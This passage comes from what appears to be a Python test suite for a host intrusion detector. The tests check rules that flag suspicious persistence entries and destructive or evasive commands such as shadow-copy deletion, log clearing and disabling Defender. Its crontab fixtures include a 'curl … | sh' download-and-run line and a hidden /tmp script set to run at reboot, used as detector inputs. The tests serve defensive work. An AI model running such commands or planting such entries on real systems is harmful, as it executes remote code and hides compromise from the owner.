            persist(T0, "startup_items", name="Loader", path="rundll32 x.dll,Entry", args="",
                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u")]
    enc, dl, ld = settle(det, *rows)
    assert (enc.base_severity, enc.facts["program"], enc.facts["signals"]) == (4, "powershell.exe", ["an encoded or download-and-run command"])
    assert (dl.base_severity, dl.facts["program"], dl.facts["folder"]) == (4, "cmd.exe", "downloads")
    assert (ld.base_severity, ld.facts["program"], ld.facts["shell"]) == (3, "rundll32.exe", True)
    for c in (enc, dl, ld):
        no_paths(c)
    assert _entry_key("update_added") == "update_added" and _entry_key("backup_cache") == "backup_cache"


def test_a_corrupted_saved_known_set_is_discarded_at_restore():
    import pytest
    for bad in ({"known": "junk"}, {"known": {"$items": [[["a"], 1.0]]}}):
        with pytest.raises(ValueError):
            NewPersistence(st()).restore(bad)
    tmp = persist(T0, "crontab", event="@reboot", minute="", hour="", day_of_month="", month="", day_of_week="",
                  command="/tmp/.x/run.sh", path="/var/spool/cron/crontabs/u")
    (bad,) = settle(NewPersistence(st()), tmp)
    assert bad.base_severity == 4 and bad.facts["folder"] == "temp"
    pipe = persist(T0, "crontab", event="", minute="0", hour="*", day_of_month="*", month="*", day_of_week="*",
                   command="curl -s https://203.0.113.5/x | sh", path="/var/spool/cron/crontabs/u")
    (dl,) = settle(NewPersistence(st()), pipe)
    assert dl.base_severity == 4 and dl.facts["signals"] and dl.facts["url"]
    agent = persist(T0, "launchd_run_at_load", label="com.example.helper", program="/Users/u/Library/helper.sh",
                    program_arguments="", path="/Users/u/Library/LaunchAgents/com.example.helper.plist")
    (la,) = settle(NewPersistence(st()), agent)
    assert la.facts["kind"] == "launch agent" and la.facts["entry"] == "com.example.helper" and la.facts["folder"] == "profile"


# ------------------------------------------------------------ R24 destructive or evasive command

VSSADMIN = r"C:\Windows\System32\vssadmin.exe"


def test_shadow_copies_or_logs_removed_is_must_alert_on_any_program():
    (c,) = run(DestructiveCommand(st()), start(T0, VSSADMIN, CMD, cmd_shadow="1"))
    assert c.must_alert and c.base_severity == 5 and c.detector == "host_destructive"
    assert c.facts["harm"] == ["shadow copies, backups or recovery removed"] and c.facts["program"] == "vssadmin.exe"
    assert c.facts["parent"] == "cmd.exe" and c.facts["parent_class"] == "shell" and c.indicators == ["vssadmin.exe"]
    no_paths(c)
    (logs,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_logclear="1", cmd_hidden="1"))
    assert logs.must_alert and logs.facts["harm"] == ["event logs cleared"] and logs.facts["unusual"] == ["a hidden window"]


def test_defender_and_account_changes_alert_but_can_be_suppressed():
    (d,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_defender="1"))
    assert (d.base_severity, d.must_alert) == (4, False) and d.facts["harm"] == ["Defender turned off or given an exclusion"]
    (a,) = run(DestructiveCommand(st()), start(T0, CMD, EXPLORER, cmd_admin="1"))
    assert (a.base_severity, a.must_alert) == (4, False) and a.title == "Protection or accounts changed on the PC"
    (both,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_defender="1", cmd_shadow="1"))
    assert both.must_alert and len(both.facts["harm"]) == 2
    assert run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1", cmd_dl="1")) == []   # R17's signals are R17's
    assert run(DestructiveCommand(st()), start(T0, VSSADMIN, CMD)) == []                           # vssadmin list shadows: nothing


def test_the_rule_and_its_signals_are_wired_in():
    from tapwatch.hostrules import NAMES, flags_of
    from tapwatch.router import CODE_ONLY
    assert "host_destructive" in NAMES and "host_destructive" in CODE_ONLY
    assert flags_of({"cmd_shadow": "1", "cmd_admin": "1", "cmd_url": "1"}) == ("shadow", "admin", "url")
